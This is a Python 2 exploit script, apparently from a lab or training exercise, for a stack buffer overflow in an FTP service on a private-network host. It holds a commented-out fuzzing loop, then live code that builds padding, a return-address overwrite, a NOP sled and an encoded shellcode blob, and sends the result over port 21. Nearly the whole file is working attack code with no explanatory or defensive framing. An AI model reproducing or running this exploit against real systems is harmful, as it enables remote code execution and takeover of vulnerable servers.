import sys, socket
from time import *

# buffer = 'A' * 100
#
# while True:
#   try:
#     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     s.connect(('192.168.63.152', 21))
#     s.send('HOST: ' + buffer + '\r\n')
#     s.close()
#
#     sleep(1)
#
#     print 'BUFFER SIZE %s BYTES ' % str(len(buffer))
#     buffer = buffer + 'A' * 100
#
#   except:
#     print ''
#     print 'FUZZING CRUSHED AT %s BYTES ' % str(len(buffer))
#     sys.exit()

buffer  = '\x41' * 245
buffer += '\x49\xF0\xDE\x77'
buffer += '\x90' * 100
buffer += (
  "\xbe\x77\x13\xbf\x9b\xd9\xd0\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
  "\x52\x31\x75\x12\x03\x75\x12\x83\x9a\xef\x5d\x6e\x98\xf8\x20"
  "\x91\x60\xf9\x44\x1b\x85\xc8\x44\x7f\xce\x7b\x75\x0b\x82\x77"
  "\xfe\x59\x36\x03\x72\x76\x39\xa4\x39\xa0\x74\x35\x11\x90\x17"
  "\xb5\x68\xc5\xf7\x84\xa2\x18\xf6\xc1\xdf\xd1\xaa\x9a\x94\x44"
  "\x5a\xae\xe1\x54\xd1\xfc\xe4\xdc\x06\xb4\x07\xcc\x99\xce\x51"
  "\xce\x18\x02\xea\x47\x02\x47\xd7\x1e\xb9\xb3\xa3\xa0\x6b\x8a"
  "\x4c\x0e\x52\x22\xbf\x4e\x93\x85\x20\x25\xed\xf5\xdd\x3e\x2a"
  "\x87\x39\xca\xa8\x2f\xc9\x6c\x14\xd1\x1e\xea\xdf\xdd\xeb\x78"
  "\x87\xc1\xea\xad\xbc\xfe\x67\x50\x12\x77\x33\x77\xb6\xd3\xe7"
  "\x16\xef\xb9\x46\x26\xef\x61\x36\x82\x64\x8f\x23\xbf\x27\xd8"
  "\x80\xf2\xd7\x18\x8f\x85\xa4\x2a\x10\x3e\x22\x07\xd9\x98\xb5"
  "\x68\xf0\x5d\x29\x97\xfb\x9d\x60\x5c\xaf\xcd\x1a\x75\xd0\x85"
  "\xda\x7a\x05\x09\x8a\xd4\xf6\xea\x7a\x95\xa6\x82\x90\x1a\x98"
  "\xb3\x9b\xf0\xb1\x5e\x66\x93\x7d\x36\x57\xf5\x16\x45\xa7\xf5"
  "\xa0\xc0\x41\x6f\x3d\x85\xda\x18\xa4\x8c\x90\xb9\x29\x1b\xdd"
  "\xfa\xa2\xa8\x22\xb4\x42\xc4\x30\x21\xa3\x93\x6a\xe4\xbc\x09"
  "\x02\x6a\x2e\xd6\xd2\xe5\x53\x41\x85\xa2\xa2\x98\x43\x5f\x9c"
  "\x32\x71\xa2\x78\x7c\x31\x79\xb9\x83\xb8\x0c\x85\xa7\xaa\xc8"
  "\x06\xec\x9e\x84\x50\xba\x48\x63\x0b\x0c\x22\x3d\xe0\xc6\xa2"
  "\xb8\xca\xd8\xb4\xc4\x06\xaf\x58\x74\xff\xf6\x67\xb9\x97\xfe"
  "\x10\xa7\x07\x00\xcb\x63\x37\x4b\x51\xc5\xd0\x12\x00\x57\xbd"
  "\xa4\xff\x94\xb8\x26\xf5\x64\x3f\x36\x7c\x60\x7b\xf0\x6d\x18"
  "\x14\x95\x91\x8f\x15\xbc"
) # \x0a\x0d

print 'SENDING CUTE-LOAD'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.63.152', 21))
s.send('HOST: ' + buffer + '\r\n')
s.close()